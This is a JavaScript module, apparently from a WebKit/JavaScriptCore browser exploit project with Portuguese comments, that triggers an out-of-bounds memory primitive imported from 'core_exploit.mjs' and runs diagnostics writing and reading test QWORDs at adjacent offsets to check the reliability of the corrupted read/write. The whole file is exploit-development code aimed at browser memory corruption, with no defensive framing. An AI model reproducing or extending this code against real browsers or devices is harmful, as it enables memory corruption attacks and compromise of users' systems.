// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// ============================================================
// FUNÇÃO DE INVESTIGAÇÃO
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_DIAGNOSTIC = "diagnostic_v15_DebugQwordRW";
    logS3(`--- Iniciando Diagnóstico (${FNAME_DIAGNOSTIC}): Depurar Leitura/Escrita de QWORDs ---`, "test", FNAME_DIAGNOSTIC);

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real || !oob_write_absolute || !oob_read_absolute) {
            throw new Error("OOB Init ou primitivas R/W falharam.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_DIAGNOSTIC);

        const OFFSET_PRIMARY_TEST = 0x20; // Offset problemático do log anterior
        const OFFSET_BEFORE = OFFSET_PRIMARY_TEST - 8; // 0x18
        const OFFSET_AFTER = OFFSET_PRIMARY_TEST + 8;  // 0x28

        const QWORD_A = new AdvancedInt64(0xAAAA1111, 0xAAAA2222);
        const QWORD_B = new AdvancedInt64(0xBBBB3333, 0xBBBB4444);
        const QWORD_C = new AdvancedInt64(0xCCCC5555, 0xCCCC6666);
        const QWORD_D = new AdvancedInt64(0xDDDD7777, 0xDDDD8888);


        logS3(`TESTE 1: Escrita isolada em ${toHex(OFFSET_PRIMARY_TEST)}`, "info", FNAME_DIAGNOSTIC);
        // Limpar área
        oob_write_absolute(OFFSET_BEFORE, AdvancedInt64.Zero, 8);
        oob_write_absolute(OFFSET_PRIMARY_TEST, AdvancedInt64.Zero, 8);
        oob_write_absolute(OFFSET_AFTER, AdvancedInt64.Zero, 8);
        await PAUSE_S3(50);

        oob_write_absolute(OFFSET_PRIMARY_TEST, QWORD_A, 8);
        logS3(`  Escrito ${QWORD_A.toString(true)} em ${toHex(OFFSET_PRIMARY_TEST)}`, "info", FNAME_DIAGNOSTIC);
        let read_val = oob_read_absolute(OFFSET_PRIMARY_TEST, 8);
        logS3(`  Lido de  ${toHex(OFFSET_PRIMARY_TEST)}: ${read_val.toString(true)} - ${read_val.equals(QWORD_A) ? "CORRETO" : "INCORRETO!"}`, read_val.equals(QWORD_A) ? "good" : "error", FNAME_DIAGNOSTIC);
        await PAUSE_S3(50);

        logS3(`TESTE 2: Escritas adjacentes (A->B->C)`, "info", FNAME_DIAGNOSTIC);
        // Limpar área
        oob_write_absolute(OFFSET_BEFORE, AdvancedInt64.Zero, 8);
        oob_write_absolute(OFFSET_PRIMARY_TEST, AdvancedInt64.Zero, 8);
        oob_write_absolute(OFFSET_AFTER, AdvancedInt64.Zero, 8);
        oob_write_absolute(OFFSET_AFTER + 8, AdvancedInt64.Zero, 8); // Limpar um pouco mais
        await PAUSE_S3(50);

        logS3(`  Escrevendo ${QWORD_A.toString(true)} em ${toHex(OFFSET_BEFORE)} (adjacente ANTES)`, "info", FNAME_DIAGNOSTIC);
        oob_write_absolute(OFFSET_BEFORE, QWORD_A, 8);
        read_val = oob_read_absolute(OFFSET_BEFORE, 8);
        logS3(`    Lido de ${toHex(OFFSET_BEFORE)}: ${read_val.toString(true)} - ${read_val.equals(QWORD_A) ? "OK" : "FALHA"}`, "info", FNAME_DIAGNOSTIC);

        logS3(`  Escrevendo ${QWORD_B.toString(true)} em ${toHex(OFFSET_PRIMARY_TEST)} (PRIMÁRIO)`, "info", FNAME_DIAGNOSTIC);
        oob_write_absolute(OFFSET_PRIMARY_TEST, QWORD_B, 8);
        read_val = oob_read_absolute(OFFSET_PRIMARY_TEST, 8);
        logS3(`    Lido de ${toHex(OFFSET_PRIMARY_TEST)}: ${read_val.toString(true)} - ${read_val.equals(QWORD_B) ? "OK" : "FALHA"}`, "info", FNAME_DIAGNOSTIC);
        // Verificar se a escrita em OFFSET_PRIMARY_TEST afetou OFFSET_BEFORE
        let read_val_before = oob_read_absolute(OFFSET_BEFORE, 8);
        if (!read_val_before.equals(QWORD_A)) {
            logS3(`    ALERTA: Escrita em ${toHex(OFFSET_PRIMARY_TEST)} mudou ${toHex(OFFSET_BEFORE)} de ${QWORD_A.toString(true)} para ${read_val_before.toString(true)}`, "warn", FNAME_DIAGNOSTIC);
        }


        logS3(`  Escrevendo ${QWORD_C.toString(true)} em ${toHex(OFFSET_AFTER)} (adjacente DEPOIS)`, "info", FNAME_DIAGNOSTIC);
        oob_write_absolute(OFFSET_AFTER, QWORD_C, 8);
        read_val = oob_read_absolute(OFFSET_AFTER, 8);
        logS3(`    Lido de ${toHex(OFFSET_AFTER)}: ${read_val.toString(true)} - ${read_val.equals(QWORD_C) ? "OK" : "FALHA"}`, "info", FNAME_DIAGNOSTIC);
        // Verificar se a escrita em OFFSET_AFTER afetou OFFSET_PRIMARY_TEST
        let read_val_primary = oob_read_absolute(OFFSET_PRIMARY_TEST, 8);
        if (!read_val_primary.equals(QWORD_B)) {
            logS3(`    ALERTA: Escrita em ${toHex(OFFSET_AFTER)} mudou ${toHex(OFFSET_PRIMARY_TEST)} de ${QWORD_B.toString(true)} para ${read_val_primary.toString(true)}`, "warn", FNAME_DIAGNOSTIC);
        }
        // E verificar se afetou OFFSET_BEFORE
        read_val_before = oob_read_absolute(OFFSET_BEFORE, 8);
         if (!read_val_before.equals(QWORD_A)) {
            logS3(`    ALERTA: Escrita em ${toHex(OFFSET_AFTER)} mudou ${toHex(OFFSET_BEFORE)} de ${QWORD_A.toString(true)} para ${read_val_before.toString(true)}`, "warn", FNAME_DIAGNOSTIC);
        }
        await PAUSE_S3(50);

        logS3(`TESTE 3: Relembrando o teste original com múltiplos writes. Offsets: 0x18, 0x20, 0x24, 0x28`, "info", FNAME_DIAGNOSTIC);
        const test_offsets_original = [0x18, 0x20, 0x24, 0x28];
        const qwords_original_test = [QWORD_A, QWORD_B, QWORD_C, QWORD_D];

        logS3("  Limpando área para Teste 3...", "info", FNAME_DIAGNOSTIC);
        for (const offset of test_offsets_original) {
            oob_write_absolute(offset, AdvancedInt64.Zero, 8);
        }
        await PAUSE_S3(50);

        logS3("  Escrevendo valores para Teste 3...", "info", FNAME_DIAGNOSTIC);
        for (let i = 0; i < test_offsets_original.length; i++) {
            const offset = test_offsets_original[i];
            const qword_to_write = qwords_original_test[i];
            oob_write_absolute(offset, qword_to_write, 8);
            logS3(`    Escrito ${qword_to_write.toString(true)} em ${toHex(offset)}`, "info", FNAME_DIAGNOSTIC);
        }
        await PAUSE_S3(50);

        logS3("  Lendo valores de volta para Teste 3...", "info", FNAME_DIAGNOSTIC);
        for (let i = 0; i < test_offsets_original.length; i++) {
            const offset = test_offsets_original[i];
            const expected_qword = qwords_original_test[i];
            read_val = oob_read_absolute(offset, 8);
            logS3(`    Lido de ${toHex(offset)}: ${read_val.toString(true)} (Esperado: ${expected_qword.toString(true)}) - ${read_val.equals(expected_qword) ? "CORRETO" : "INCORRETO!"}`, read_val.equals(expected_qword) ? "good" : "error", FNAME_DIAGNOSTIC);
        }

        logS3("Diagnóstico QWORD R/W concluído.", "test", FNAME_DIAGNOSTIC);

    } catch (e) {
        logS3(`ERRO CRÍTICO no diagnóstico: ${e.message}`, "critical", FNAME_DIAGNOSTIC);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_DIAGNOSTIC);
        document.title = "Diagnóstico QWORD FALHOU!";
    } finally {
        clearOOBEnvironment();
        logS3(`--- Diagnóstico (${FNAME_DIAGNOSTIC}) Concluído ---`, "test", FNAME_DIAGNOSTIC);
    }
}
